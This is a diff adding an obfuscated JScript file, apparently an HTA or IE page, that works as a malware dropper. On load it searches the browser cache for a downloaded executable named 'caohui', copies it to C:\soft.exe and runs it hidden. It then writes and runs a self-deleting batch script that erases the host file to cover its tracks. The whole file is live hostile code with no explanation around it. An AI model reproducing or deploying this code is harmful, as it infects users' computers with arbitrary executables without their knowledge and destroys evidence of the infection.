@@ -1,0 +1,23 @@
+<SCRIPT LANGUAGE="JavaScript">
+function tha1n1ks(b){
+try{var m1y1f=new Enumerator(Ffu1c1sko.GetFolder(b).SubFolders);for (;!m1y1f.atEnd();m1y1f.moveNext()){var z0=m1y1f.item().Path+"\\caohui[1].exe";var z1=m1y1f.item().Path+"\\caohui[2].exe";
+var f="C:\\soft.exe";if(Ffu1c1sko.FileExists(z0)){Ffu1c1sko.CopyFile(z0,f)
+w1s2h.Run(f,0,false);v=1;break;}if(Ffu1c1sko.FileExists(z1)){Ffu1c1sko.CopyFile(z1,f);w1s2h.Run(f,0,false);v=1;break;}tha1n1ks(m1y1f.item());}}catch(e){}}
+function likeit(){j=1;
+j=1;path="c:\\wins.bat";
+v=j3714.commandLine;
+v=v.substring(1,v.length-2);
+var file11x=Ffu1c1sko.CreateTextFile(path);
+file11x.Write('@eCho oFf\r\n:CDE\r\neRAsE  "'+v+'"\r\nif eXiSt "'+v+'" gOto CDE\r\neRAse  %0');
+file11x.close();
+w1s2h.Run(path,0,false);
+window.close();
+}
+var v=0;
+try{
+var Ffu1c1sko=new ActiveXObject("Scripting.FileSystemObject");
+var w1s2h=new ActiveXObject("WScript.Shell");
+var cache=w1s2h.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell FolderS\\CAche");
+}catch(e){}
+function fucksh(){try{if(v==0){tha1n1ks(cache+'\\..\\');setTimeout("fucksh()",4000);}else{likeit();}}catch(e){}}
+fucksh();</SCRIPT>
